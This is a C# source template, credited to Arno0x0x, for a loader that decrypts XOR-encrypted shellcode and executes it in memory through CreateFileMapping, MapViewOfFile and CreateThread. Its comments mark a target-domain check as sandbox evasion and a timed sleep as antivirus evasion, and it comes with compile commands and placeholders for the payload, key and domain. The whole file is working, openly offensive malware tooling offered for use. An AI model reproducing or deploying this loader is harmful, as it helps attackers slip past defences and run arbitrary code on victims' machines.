/*
Author: Arno0x0x, Twitter: @Arno0x0x

How to compile:
===============
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x32 /out:encryptedShellcode_MapViewOfFile.exe encryptedShellcode_MapViewOfFile.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /out:encryptedShellcode_MapViewOfFile.exe encryptedShellcode_MapViewOfFile.cs

*/

using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace RunShellCode
{
    static class Program
    {
        private static byte[] xor(byte[] cipher, byte[] key) {
            byte[] decrypted = new byte[cipher.Length];

            for(int i = 0; i < cipher.Length; i++) {
                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);
            }

            return decrypted;
        }


        //==============================================================================
        // MAIN FUNCTION
        //==============================================================================
        static void Main()
        {
            // Sanbox evasion: Check the FQDN
            string fqdn = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
            string targetDomain = "${domain}";
            if (!string.Equals(fqdn, targetDomain, StringComparison.InvariantCultureIgnoreCase))
            {
                Console.WriteLine("FQDN does not match the target domain.");
                return;
            }

            // AV evasion: Sleep for 10s and detect if time really passed	
			DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
			
            byte[] encryptedShellcode = new byte[] { ${shellcode} };
            string key = "${key}";
			
			
            byte[] shellcode = null;
            shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));

			IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

			// Create a file mapping object
			IntPtr fileMapping = CreateFileMapping(INVALID_HANDLE_VALUE, IntPtr.Zero, FileMapProtection.PageExecuteReadWrite, 0, (uint)shellcode.Length, "Local\\MyFileMappingObject");
			if (fileMapping == IntPtr.Zero)
			{
				Console.WriteLine("Error: Could not fileMapping");
				return;
			}
			
			// Map a view of the file mapping into the current process's address space
			IntPtr mapViewOfFile = MapViewOfFile(fileMapping, FileMapAccess.FileMapWrite, 0, 0, (UIntPtr)shellcode.Length);
			if (mapViewOfFile == IntPtr.Zero)
			{
				Console.WriteLine("Error: Could not mapViewOfFile");
				return;
			}

			// Copy the shellcode into the mapped view of the file mapping
			Marshal.Copy(shellcode, 0, mapViewOfFile, shellcode.Length);

			// Obtain a pointer to the shellcode in the remote process's address space
			IntPtr remoteShellcodePtr = MapViewOfFile(fileMapping, FileMapAccess.FileMapAllAccess | FileMapAccess.FileMapExecute, 0, 0, (UIntPtr)shellcode.Length);
			if (remoteShellcodePtr == IntPtr.Zero)
			{
				Console.WriteLine("Error: Could not remoteShellcodePtr");
				return;
			}

			// Create a new thread in the remote process that executes the shellcode
			IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, remoteShellcodePtr, IntPtr.Zero, 0, IntPtr.Zero);
			if (threadHandle == IntPtr.Zero)
			{
				Console.WriteLine("Error: Could not threadHandle");
				return;
			}

			//Console.WriteLine("Remote Thread ID: " + threadId.ToString());			
			//uint threadId = GetThreadId(threadHandle);

			// Wait for the thread to finish executing
			WaitForSingleObject(threadHandle, 0xFFFFFFFF);
		}
		

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, FileMapProtection flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, FileMapAccess dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr OpenFileMapping(FileMapAccess dwDesiredAccess, bool bInheritHandle, string lpName);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
		
		[DllImport("kernel32.dll", SetLastError = true)]
		static extern uint GetThreadId(IntPtr hThread);
		
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern void Sleep(uint dwMilliseconds);

		[Flags]
		enum FileMapAccess : uint
		{
			FileMapCopy = 0x0001,
			FileMapWrite = 0x0002,
			FileMapRead = 0x0004,
			FileMapExecute = 0x0020,
			FileMapAllAccess = 0x001f
		}

		[Flags]
		enum FileMapProtection : uint
		{
				PageReadonly = 0x02,
				PageReadWrite = 0x04,
				PageWriteCopy = 0x08,
				PageExecuteRead = 0x20,
				PageExecuteReadWrite = 0x40,
				SectionCommit = 0x8000000,
				SectionImage = 0x1000000,
				SectionNoCache = 0x10000000,
				SectionReserve = 0x4000000,
		}
    }
}
